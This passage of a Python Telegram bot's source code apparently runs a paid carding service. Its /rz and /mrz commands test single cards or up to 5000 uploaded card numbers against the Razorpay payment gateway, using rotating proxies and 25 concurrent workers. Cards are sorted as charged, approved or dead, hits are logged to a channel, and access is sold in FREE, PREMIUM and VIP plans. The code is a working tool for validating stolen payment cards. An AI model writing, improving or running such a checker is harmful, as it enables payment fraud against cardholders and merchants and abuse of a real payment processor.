        return
    if check_status == 'expired':
        await event.reply(premium_emoji("⏰ <b>Plan Expired</b>\n\nUse /plan to purchase."), parse_mode='html')
        return
    if check_status == 'group_only':
        await event.reply(premium_emoji(
            f"🆓 <b>Free Plan — Group Only</b>\n\nJoin group to check:\n{GROUP_LINK}"
        ), buttons=[[Button.url("🏠 Join Group", GROUP_LINK)]], parse_mode='html')
        return
    if check_status == 'cc_limit':
        await event.reply(premium_emoji("📊 <b>CC Limit Reached!</b>\n\nUse /plan to purchase more."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return

    cc_input = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid format. Use: <code>/rz card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]
    rz_loading = (
        f"⏳ 𝗜𝗦 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 . . . .\n\n"
        f"💳 Card » <code>{card}</code>\n"
        f"🌐 Gateway » 𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮\n"
        f"🔍 Status » 𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚...\n\n"
        f"⚡ Powered by @UNTAMEDU"
    )
    status_msg = await event.reply(premium_emoji(rz_loading), parse_mode='html')

    try:
        result = await check_razorpay_with_retry(card, proxies, max_retries=3)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        increment_cc_used(user_id)

        if result['status'] == 'Charged':
            status_header = "💎 𝑪𝑯𝑨𝑹𝑮𝑬𝑫"
            await log_hit_to_channel(result, 'Charged', user_id, "User", check_type="Single Razorpay Check")
        elif result['status'] == 'Approved':
            status_header = "✅ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫"
            await log_hit_to_channel(result, 'Approved', user_id, "User", check_type="Single Razorpay Check")
        else:
            status_header = "❌ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫"

        resp_text = (
            f"{status_header}\n\n"
            f"💳 CC <code>{result['card']}</code>\n\n"
            f"🛒 Gateway Razorpay\n"
            f"📝 Response {result['message']}\n"
            f"💸 Price {result.get('price', '₹1')}\n\n"
            f"🆔 BIN Info {brand} - {bin_type} - {level}\n"
            f"🏦 Bank {bank}\n"
            f"🥰 Country {country} {flag}\n\n"
            f"💡 Made by @UNTAMEDU"
        )
        await status_msg.edit(premium_emoji(resp_text), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


# ─── RAZORPAY MASS CHECK ─────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/mrz(?:\s|$)'))
async def mrz_command(event):
    user_id = event.sender_id
    chat_id = event.chat_id  # group mein = group ID, private mein = user ID

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    # Razorpay gate: PREMIUM and VIP only
    if user_id not in ADMIN_ID:
        u_plan = load_users_data().get(str(user_id), {}).get('plan', 'FREE')
        if u_plan not in ('PREMIUM', 'VIP'):
            await event.reply(premium_emoji(
                "🥇 <b>PREMIUM / VIP Only</b>\n\n"
                "The Razorpay gate is restricted to\n"
                "<b>🥇 PREMIUM</b> and <b>👑 VIP</b> plan users.\n\n"
                "💡 Upgrade your plan: /plan"
            ), parse_mode='html')
            return

    check_status = can_check(user_id, event.is_private)
    if check_status == 'no_plan':
        await event.reply(premium_emoji("❌ <b>No Plan Found</b>\n\nUse /plan to see plans."), parse_mode='html')
        return
    if check_status == 'expired':
        await event.reply(premium_emoji("⏰ <b>Plan Expired</b>\n\nUse /plan to purchase."), parse_mode='html')
        return
    if check_status == 'group_only':
        await event.reply(premium_emoji(
            f"🆓 <b>Free Plan — Group Only</b>\n\nJoin group to check:\n{GROUP_LINK}"
        ), buttons=[[Button.url("🏠 Join Group", GROUP_LINK)]], parse_mode='html')
        return
    if check_status == 'cc_limit':
        await event.reply(premium_emoji("📊 <b>CC Limit Reached!</b>\n\nUse /plan to purchase more."), parse_mode='html')
        return

    # ─── ONE CHECK AT A TIME RULE (Razorpay) ─────────────────────────────────
    if user_id in user_active_check:
        current = user_active_check[user_id]
        session_type = "🛒 Shopify" if current['type'] == 'chk' else "💳 Razorpay"
        await event.reply(premium_emoji(
            f"🚫 <b>Already Running!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ <b>Active Session:</b>  {session_type}\n\n"
            f"You already have a check running.\n"
            f"Wait for it to finish, then start a new one.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Use STOP button to cancel the current check."
        ), parse_mode='html')
        return
    # ──────────────────────────────────────────────────────────────────────────

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a <code>.txt</code> file containing cards."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a <code>.txt</code> file."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')
    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)
    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found in file."), parse_mode='html')
        os.remove(file_path)
        return

    if len(cards) > 5000:
        cards = cards[:5000]

    # Per-session CC limit for ALL plans (FREE + Paid) — Razorpay
    if user_id not in ADMIN_ID:
        users_data_rz = load_users_data()
        user_plan_rz  = users_data_rz.get(str(user_id), {}).get('plan', 'FREE')
        plan_data_rz = PLANS.get(user_plan_rz, PLANS['FREE'])

        SESSION_LIMIT_RZ = plan_data_rz['cc_limit'] if user_plan_rz != 'FREE' else 100

        if len(cards) > SESSION_LIMIT_RZ:
            total_input = len(cards)
            cards = cards[:SESSION_LIMIT_RZ]
            plan_emoji = plan_data_rz.get('emoji', '💎')
            await status_msg.edit(premium_emoji(
                f"{plan_emoji} <b>{user_plan_rz} Plan</b> — checking first <b>{SESSION_LIMIT_RZ}</b> of {total_input} cards\n"
                f"💡 This is your per-session limit. You can check again after this run."
            ), parse_mode='html')
            await asyncio.sleep(1)

    os.remove(file_path)

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🔥 Starting Razorpay check for <b>{total_cards}</b> cards..."), parse_mode='html')

    session_key = f"rz_{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    # Register user for one-at-a-time check
    user_active_check[user_id] = {
        'type': 'mrz',
        'session_key': session_key,
        'chat_id': chat_id,
        'msg_id': status_msg.id
    }

    all_results = {
        'charged': [], 'approved': [], 'dead': [],
        'total': total_cards, 'checked': 0,
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Razorpay',
    }

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update_time = [time.time()]

        async def rz_worker():
            while not queue.empty() and session_key in active_sessions:
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                if not proxies:
                    break

                res = await check_razorpay_with_retry(card, proxies, max_retries=1)

                all_results['checked'] += 1
                all_results['last_card']     = card
                all_results['last_response'] = res.get('message', '')
                all_results['last_price']    = res.get('price', '₹1')

                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(chat_id, res, 'Charged', username)
                    await log_hit_to_channel(res, 'Charged', user_id, username, check_type="Shopify Mass Check")
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(chat_id, res, 'Approved', username)
                    await log_hit_to_channel(res, 'Approved', user_id, username, check_type="Shopify Mass Check")
                else:
                    all_results['dead'].append(res)

                queue.task_done()

                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(chat_id, user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass

        workers = [asyncio.create_task(rz_worker()) for _ in range(25)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        if session_key in active_sessions:
            await update_progress(chat_id, user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        # Clean up one-at-a-time lock
        if user_id in user_active_check:
            del user_active_check[user_id]

        # Batch update CC usage once at session end
        total_checked = len(all_results['charged']) + len(all_results['approved']) + len(all_results['dead'])
        if total_checked > 0:
            increment_cc_used(user_id, total_checked)

        try:
            await status_msg.delete()
        except Exception:
            pass
        await send_final_results(chat_id, all_results)


@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    message_id = event.message_id
    # Check both /chk key format and /mrz key format
    session_key = f"{user_id}_{message_id}"
    rz_session_key = f"rz_{user_id}_{message_id}"
    found_key = session_key if session_key in active_sessions else (rz_session_key if rz_session_key in active_sessions else None)
    if found_key:
        del active_sessions[found_key]
        # Also clean one-at-a-time lock when user manually stops
        if user_id in user_active_check:
            del user_active_check[user_id]
        await event.answer("Stopped", alert=True)
        await event.edit(premium_emoji("🛑 Checking stopped by user."), parse_mode='html')
    else:
        await event.answer("Already finished or not found.", alert=True)


print("✅ Bot started successfully!")
bot.run_until_disconnected()